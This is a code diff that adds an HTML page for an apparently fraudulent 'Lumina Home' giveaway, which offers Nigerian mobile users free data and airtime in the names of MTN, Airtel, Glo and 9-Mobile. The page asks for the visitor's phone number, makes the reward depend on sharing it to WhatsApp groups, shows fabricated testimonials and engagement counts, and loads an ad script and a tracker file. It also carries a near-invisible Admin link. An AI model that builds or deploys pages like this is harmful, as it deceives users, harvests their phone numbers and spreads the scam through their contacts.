@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>🎁 Lumina Home - Anniversary Giveaway</title>
+    
+    <!-- Ad Script -->
+    <script src="https://quge5.com/88/tag.min.js" data-zone="254328" async data-cfasync="false"></script>
+    
+    <!-- Fonts & Icons -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    
+    <link rel="stylesheet" href="css/style.css" />
+</head>
+<body>
+
+    <!-- ===== PRE-LOADER ===== -->
+    <div class="pre-loader" id="preLoader">
+        <div class="spinner"></div>
+        <p>Loading Experience</p>
+    </div>
+
+    <!-- ===== MAIN CONTAINER ===== -->
+    <div class="container">
+
+        <!-- ===== HEADER ===== -->
+        <div class="header">
+            <div class="badge">🎁 Limited Giveaway</div>
+            <h1>
+                Lumina Home<br />
+                <span>Anniversary Celebration 🎉</span>
+            </h1>
+            <div class="subtitle">In collaboration with MTN, Airtel, Glo &amp; 9-Mobile</div>
+        </div>
+
+        <!-- ===== STATS ===== -->
+        <div class="stats-bar">
+            <span class="label">🔥 <strong id="countdownTimer">4,548</strong></span>
+            <span class="label">Nigerians Claimed</span>
+            <span class="label">🎯 <strong>10GB + ₦5,000</strong></span>
+        </div>
+
+        <!-- ===== MARQUEE ===== -->
+        <div class="marquee-bar">
+            <marquee behavior="scroll" direction="left" scrollamount="4">
+                🎉 LUMINA HOME ANNIVERSARY CELEBRATION &bull; FREE 10GB DATA + ₦5,000 AIRTIME &bull; CLAIM NOW 🎉
+            </marquee>
+        </div>
+
+        <!-- ===== CONTENT ===== -->
+        <div class="content">
+
+            <!-- ===== INTRO ===== -->
+            <div class="section active" id="sectionIntro">
+                <div class="intro-icon">🎊</div>
+                <div class="intro-title">
+                    Get <span>10GB Free Data</span><br />
+                    + <span>₦5,000 Airtime</span>
+                </div>
+                <div class="intro-desc">
+                    <strong>Powered by:</strong> Nigeria Democratic Congress (NDC)<br />
+                    Lumina Home is giving away <strong>10GB Free Data</strong> and 
+                    <strong>₦5,000 Airtime</strong> to celebrate our anniversary!
+                </div>
+
+                <div class="form-group">
+                    <label for="networkSelect">Select Your Network</label>
+                    <select id="networkSelect">
+                        <option value="">— Select Network —</option>
+                        <option value="mtn">📶 MTN — 10GB + ₦5,000</option>
+                        <option value="airtel">📶 Airtel — 10GB + ₦5,000</option>
+                        <option value="glo">📶 Glo — 10GB + ₦5,000</option>
+                        <option value="9mobile">📶 9-Mobile — 10GB + ₦5,000</option>
+                    </select>
+                    <div class="error-text" id="networkError">Please select your network</div>
+                </div>
+
+                <button class="btn btn-primary btn-glow" id="btnGetOffer">
+                    <i class="fas fa-gift"></i> Claim Your Offer
+                </button>
+            </div>
+
+            <!-- ===== LOADER ===== -->
+            <div class="section" id="sectionLoader">
+                <div class="loader-center">
+                    <div class="spinner"></div>
+                    <p>Processing your request...</p>
+                    <div class="progress-text" id="loaderProgress">0%</div>
+                </div>
+            </div>
+
+            <!-- ===== PHONE ===== -->
+            <div class="section" id="sectionPhone">
+                <div style="text-align: center; margin-bottom: 12px;">
+                    <span style="font-size: 32px;">📱</span>
+                    <h3 style="color: #fff; font-size: 18px; font-weight: 700; margin-top: 4px;">Enter Your Number</h3>
+                    <p style="color: rgba(255,255,255,0.4); font-size: 13px;">We'll send your activation code</p>
+                </div>
+
+                <div class="form-group">
+                    <label for="phoneInput">Phone Number</label>
+                    <input type="tel" id="phoneInput" placeholder="e.g. 08012345678" maxlength="11" />
+                    <div class="error-text" id="phoneError">Please enter a valid 11-digit phone number</div>
+                </div>
+
+                <button class="btn btn-secondary" id="btnSend">
+                    <i class="fas fa-paper-plane"></i> Send Code
+                </button>
+            </div>
+
+            <!-- ===== ACTIVATING ===== -->
+            <div class="section" id="sectionActivating">
+                <div style="text-align: center; margin-bottom: 8px;">
+                    <span style="font-size: 32px;">⚡</span>
+                    <h3 style="color: #fff; font-size: 18px; font-weight: 700;">Activating Your Offer...</h3>
+                </div>
+                <div class="progress-wrap">
+                    <div class="progress-track">
+                        <div class="progress-bar" id="activationBar" style="width: 0%;"></div>
+                    </div>
+                    <div class="progress-label">
+                        <span>Processing</span>
+                        <span class="status" id="activationStatus">0%</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ===== SHARE ===== -->
+            <div class="section" id="sectionShare">
+                <div style="text-align: center; margin-bottom: 8px;">
+                    <span style="font-size: 40px;">🔒</span>
+                    <h3 style="color: #fff; font-size: 18px; font-weight: 700;">Almost There!</h3>
+                    <p style="color: rgba(255,255,255,0.4); font-size: 13px;">
+                        Your <strong style="color: #ffd700;">10GB + ₦5,000</strong> is pending verification
+                    </p>
+                </div>
+
+                <div class="share-steps">
+                    <div class="step">
+                        <span class="num">1</span>
+                        <span>Share with <strong>5 groups</strong> or <strong>15 friends</strong> on WhatsApp</span>
+                    </div>
+                    <div class="step">
+                        <span class="num">2</span>
+                        <span>Return here &amp; verification bar fills <strong>automatically</strong></span>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" id="btnShare">
+                    <i class="fab fa-whatsapp"></i> Share on WhatsApp
+                </button>
+
+                <div class="progress-wrap mt-16">
+                    <div class="progress-track">
+                        <div class="progress-bar" id="shareBar" style="width: 0%;"></div>
+                    </div>
+                    <div class="progress-label">
+                        <span>Verification</span>
+                        <span class="status" id="shareStatus">0%</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ===== CLAIM ===== -->
+            <div class="section" id="sectionClaim">
+                <div class="claim-icon">🎉</div>
+                <div class="claim-title">
+                    Verification <span>Complete!</span>
+                </div>
+                <div class="claim-sub">
+                    Your <strong style="color: #ffd700;">10GB + ₦5,000</strong> is ready to activate
+                </div>
+
+                <div class="claim-buttons">
+                    <button class="btn btn-primary btn-glow" id="btnActivateData">
+                        <i class="fas fa-wifi"></i> Activate 10GB Data
+                    </button>
+                    <button class="btn btn-secondary" id="btnActivateAirtime">
+                        <i class="fas fa-phone"></i> Activate Airtime
+                    </button>
+                </div>
+            </div>
+
+            <!-- ===== COMMENTS ===== -->
+            <div class="comments-section">
+                <div class="counter">
+                    <div class="reactions">
+                        <img src="https://i.imgur.com/g6cV61A.png" alt="like" />
+                        <img src="https://i.imgur.com/0UHB1f0.png" alt="love" />
+                        <img src="https://i.imgur.com/sSMYbTT.png" alt="care" />
+                        <span class="count">134K</span>
+                    </div>
+                    <span class="count">23K comments</span>
+                    <span>·</span>
+                    <span class="count">12K shares</span>
+                </div>
+
+                <div class="action-bar">
+                    <span><i class="far fa-thumbs-up"></i> Like</span>
+                    <span><i class="far fa-comment"></i> Comment</span>
+                    <span><i class="fas fa-share"></i> Share</span>
+                </div>
+
+                <!-- Comments -->
+                <div class="comment-item">
+                    <img class="avatar" src="https://i.imgur.com/xp1ER6K.jpg" alt="avatar" />
+                    <div class="body">
+                        <span class="name">Joseph Emmanuel <span class="badge">Verified</span></span>
+                        <div class="text">I doubted this at first, but it's real! Just got my ₦5,000 airtime. Thank you Lumina Home! 🎉</div>
+                        <div class="meta">
+                            <span>1m</span>
+                            <span>·</span>
+                            <span>Like</span>
+                            <span>·</span>
+                            <span>Reply</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="comment-item">
+                    <img class="avatar" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhC5I3x2Ykht2M6Pktwjzc0xV7dmqJty_eCw4rDcFV5r_eDxXMRGWJF9tuYPEpe_fvnM0DtzfdDKbQUFKAhhnj1tXN97o8EJP_l_XFJeyX7dc1bm6bpocYaeGtrngVoV9TruTJrlONHypx0/s1600/FB_IMG_15869726679037399.jpg" alt="avatar" />
+                    <div class="body">
+                        <span class="name">David Anthony</span>
+                        <div class="text">I just received 10GB! Wow, unbelievable. One of the rare websites that truly gifts! 🙌</div>
+                        <div class="meta">
+                            <span>2m</span>
+                            <span>·</span>
+                            <span>Like</span>
+                            <span>·</span>
+                            <span>Reply</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="comment-item reply">
+                    <img class="avatar" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgAg5sqDhd96nW2Ek_9vet4ztoELeaZmKUSIgzUImj18MpjZvy2qNPXaEgkSNOxLtEOvrT2iPc9RuUUmu2xnhRydySo5WIFpWEJiYmuMDqXnPKrqFzC8aABhp-mrUbaqinlsgJ5LA6hwZS/s1600/FB_IMG_15869730921979436.jpg" alt="avatar" />
+                    <div class="body">
+                        <span class="name">Amahle John</span>
+                        <div class="text">Mine is pending because I just finished sharing. Please help! 😅</div>
+                        <div class="meta">
+                            <span>1m</span>
+                            <span>·</span>
+                            <span>Like</span>
+                            <span>·</span>
+                            <span>Reply</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="comment-item">
+                    <img class="avatar" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhETuUnZKp3TrK9zDTqBtlN4ahx1RrCH6RqG14wW5J8CIBv6HYs7gQSvAiZBwn8NT3lXcz3h8jR87s1z_qZ2kzEoZ7HRnWzskSuqK5NOfKyiQByU3BgypGHXP-m9LlPyFh2FhIsUdN6cO1DnZb-GTtRMDQk8L75NDDUnEC4JxQ6OwsnAjbKVhhlNxrLyQ/s320/9F5D4C76-9CCB-45EB-BA73-73A125849593.jpeg" alt="avatar" />
+                    <div class="body">
+                        <span class="name">Bonolo</span>
+                        <div class="text">My guy got 10GB on MTN already. I pray I get approved too! 🙏</div>
+                        <div class="meta">
+                            <span>4m</span>
+                            <span>·</span>
+                            <span>Like</span>
+                            <span>·</span>
+                            <span>Reply</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Comment Input -->
+                <div class="comment-input">
+                    <input type="text" placeholder="Write a comment..." id="commentInput" />
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ===== FOOTER ===== -->
+    <div style="max-width: 480px; margin: 20px auto; text-align: center; padding: 10px;">
+        <a href="terms.html" style="color: rgba(255,255,255,0.2); font-size: 11px; margin: 0 10px; text-decoration: none;">Terms</a>
+        <a href="faq.html" style="color: rgba(255,255,255,0.2); font-size: 11px; margin: 0 10px; text-decoration: none;">FAQ</a>
+        <a href="contact.html" style="color: rgba(255,255,255,0.2); font-size: 11px; margin: 0 10px; text-decoration: none;">Contact</a>
+        <a href="reviews.html" style="color: rgba(255,255,255,0.2); font-size: 11px; margin: 0 10px; text-decoration: none;">Reviews</a>
+        <a href="login.html" style="color: rgba(255,255,255,0.05); font-size: 11px; margin: 0 10px; text-decoration: none;">Admin</a>
+    </div>
+
+    <!-- ===== SCRIPTS ===== -->
+    <script src="js/main.js"></script>
+    <script src="js/tracker.js"></script>
+</body>
+</html>
